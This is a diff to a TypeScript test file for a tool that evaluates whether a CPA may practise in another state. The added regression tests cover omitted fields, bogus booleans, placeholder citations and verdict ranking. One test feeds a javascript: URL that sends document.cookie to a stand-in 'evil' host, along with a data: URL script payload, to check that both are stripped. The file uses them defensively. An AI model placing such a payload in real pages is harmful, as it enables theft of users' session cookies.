@@ -4,6 +4,7 @@ import {
   evaluateIndividualMobility,
   evaluateFirmRegistration,
   isValidServiceType,
+  normalizeRuleRow,
   MOBILITY_DISCLAIMER,
   type MobilityInput,
   type MobilityRuleRow,
@@ -186,8 +187,12 @@ describe("individual practice privilege", () => {
   });
 
   it("treats home state as not-applicable rather than granting anything", () => {
+    // Was asserted as "not_verified" until 2026-07-30 review pointed out
+    // that conflates "we lack data" with "the question doesn't apply" --
+    // and the UI then told a CPA we had no verified information about
+    // their OWN home state, which is false and alarming.
     const res = evaluateIndividualMobility(input({ targetStateSlug: "california" }), verifiedPermissiveRule());
-    expect(res.verdict).toBe("not_verified");
+    expect(res.verdict).toBe("not_applicable");
     expect(res.summary).toMatch(/home state/i);
   });
 });
@@ -304,5 +309,129 @@ describe("SAFETY: rules that are in flux, stale, or of an unknown test kind", ()
   it("the flux block cannot be bypassed via the firm path", () => {
     const rule = verifiedPermissiveRule({ rule_in_flux: true, firm_registration_tax: false });
     expect(evaluateFirmRegistration(input({ serviceType: "tax" }), rule).verdict).toBe("not_verified");
+  });
+});
+
+describe("REGRESSION: the critical undefined-is-not-null defect (2026-07-30 review)", () => {
+  it("an OMITTED field must NOT produce a permissive verdict -- reproduced over HTTP before the fix", () => {
+    // The natural failure: a researcher adds a state with the citation they
+    // found and omits the fields they could not verify (the obvious reading
+    // of "when in doubt, leave it null"). Every guard was `=== null`, so
+    // `undefined` sailed past both it and the `=== false` check into the
+    // permissive branch -- yielding "practice privilege exists, no notice
+    // or fee" from a row that verified none of it.
+    const partial = normalizeRuleRow({
+      state: "Texas",
+      state_slug: "texas",
+      citation: "Tex. Occ. Code s 901.462",
+      citation_url: "https://example.gov/s",
+      source_url: "https://example.gov/b",
+      verified_date: new Date().toISOString().slice(0, 10),
+      confidence: "single_source",
+      // every determination field omitted
+    });
+    expect(partial).not.toBeNull();
+    const res = evaluateMobility(input(), partial);
+    expect(res.overall).toBe("not_verified");
+    expect(res.individual.verdict).toBe("not_verified");
+  });
+
+  it("normalizes NON-BOOLEAN truthy/falsy values to null rather than trusting them", () => {
+    // "false" (string) previously produced CLEAR with a "state extends
+    // practice privilege" summary -- from a row that literally said no.
+    for (const bogus of ["false", "true", 1, 0, "yes", {}, []]) {
+      const row = normalizeRuleRow({
+        state_slug: "texas",
+        individual_practice_privilege: bogus,
+        notice_required: bogus,
+        fee_required: bogus,
+        citation: "Tex. Occ. Code s 901.462",
+        verified_date: new Date().toISOString().slice(0, 10),
+        equivalence_test: "individual_criteria",
+        rule_in_flux: false,
+      });
+      expect(row!.individual_practice_privilege, `value ${JSON.stringify(bogus)}`).toBeNull();
+      expect(evaluateMobility(input(), row).overall).toBe("not_verified");
+    }
+  });
+
+  it("preserves genuine booleans", () => {
+    const row = normalizeRuleRow({
+      state_slug: "texas",
+      individual_practice_privilege: true,
+      notice_required: false,
+      citation: "Tex. Occ. Code s 901.462",
+    });
+    expect(row!.individual_practice_privilege).toBe(true);
+    expect(row!.notice_required).toBe(false);
+  });
+
+  it("drops a row with no usable state_slug entirely", () => {
+    for (const bad of [null, undefined, "string", [], {}, { state_slug: "" }, { state_slug: 5 }]) {
+      expect(normalizeRuleRow(bad)).toBeNull();
+    }
+  });
+});
+
+describe("REGRESSION: placeholder citations and unsafe URLs", () => {
+  it("a whitespace or placeholder citation cannot certify a CLEAR verdict", () => {
+    // The guard was a truthiness test, so "   ", "TBD", "pending" all
+    // satisfied it -- exactly the placeholder-as-source case it warned of.
+    for (const c of ["   ", "TBD", "pending", "-", "n/a", "??", "unknown"]) {
+      const rule = verifiedPermissiveRule({ citation: c });
+      expect(evaluateMobility(input(), rule).overall, `citation ${JSON.stringify(c)}`).toBe("not_verified");
+    }
+  });
+
+  it("still accepts a real citation", () => {
+    expect(evaluateMobility(input(), verifiedPermissiveRule()).overall).toBe("clear");
+  });
+
+  it("strips javascript: and data: URLs -- HTML-escaping does NOT stop them in an href", () => {
+    const row = normalizeRuleRow({
+      state_slug: "texas",
+      citation: "Tex. Occ. Code s 901.462",
+      citation_url: "javascript:fetch('https://evil/'+document.cookie)",
+      source_url: "data:text/html,<script>alert(1)</script>",
+    });
+    expect(row!.citation_url).toBeNull();
+    expect(row!.source_url).toBeNull();
+  });
+
+  it("keeps http and https URLs", () => {
+    const row = normalizeRuleRow({
+      state_slug: "texas",
+      citation_url: "https://ilga.gov/x",
+      source_url: "http://board.example.gov/y",
+    });
+    expect(row!.citation_url).toBe("https://ilga.gov/x");
+    expect(row!.source_url).toBe("http://board.example.gov/y");
+  });
+});
+
+describe("REGRESSION: verdict semantics", () => {
+  it("home state is NOT_APPLICABLE, not 'not verified' -- we are not claiming ignorance of their own state", () => {
+    const res = evaluateMobility(input({ targetStateSlug: "california" }), verifiedPermissiveRule());
+    expect(res.individual.verdict).toBe("not_applicable");
+    expect(res.firm.verdict).toBe("not_applicable");
+    expect(res.overall).toBe("not_applicable");
+  });
+
+  it("not_verified now OUTRANKS action_required in the overall verdict", () => {
+    // action_required implies we evaluated the state ("do X and you're
+    // set"), a stronger claim than we can make when any part is unverified.
+    const res = evaluateMobility(input({ licenseInGoodStanding: false }), null);
+    expect(res.individual.verdict).toBe("action_required");
+    expect(res.firm.verdict).toBe("not_verified");
+    expect(res.overall).toBe("not_verified");
+  });
+
+  it("a downgraded finding carries NO provenance", () => {
+    const rule = verifiedPermissiveRule({ citation: "TBD", confidence: "single_source" });
+    const res = evaluateIndividualMobility(input(), rule);
+    expect(res.verdict).toBe("not_verified");
+    expect(res.confidence).toBeNull();
+    expect(res.citationUrl).toBeNull();
+    expect(res.sourceUrl).toBeNull();
   });
 });
